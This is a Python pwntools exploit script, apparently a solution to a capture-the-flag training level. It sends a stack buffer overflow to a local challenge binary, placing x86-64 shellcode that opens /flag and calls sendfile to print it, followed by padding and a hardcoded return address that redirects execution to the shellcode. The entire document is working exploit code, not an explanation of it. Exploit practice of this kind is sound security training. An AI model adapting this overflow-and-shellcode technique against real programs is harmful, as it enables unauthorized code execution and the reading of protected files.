from pwn import *
import binascii
file = "/challenge/toddlerone_level2.1"
shellcodeaddr = p64(0x7fffffffbef0)
retaddr = 136
shellcode = ("""
xor rax, rax
xor r10, r10
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
mov rax, 2
lea rdi, [rip+flag]
syscall
mov rsi, rax
xor rdi, rdi
mov rdi, 1
mov rax, 40
mov r10, 100
syscall

flag:
    .string "/flag"
""")



shellbytes = asm(shellcode, os='linux', arch='x86_64')

#p = gdb.debug(file, aslr=False)
p = process(file)
p.sendline(bytes(str(retaddr + len(shellbytes)), 'ascii'))
print(binascii.hexlify(shellbytes))
print(retaddr-len(shellbytes))
p.sendline(shellbytes + b'A'*(retaddr-len(shellbytes)) + shellcodeaddr)
print(p.recvall())
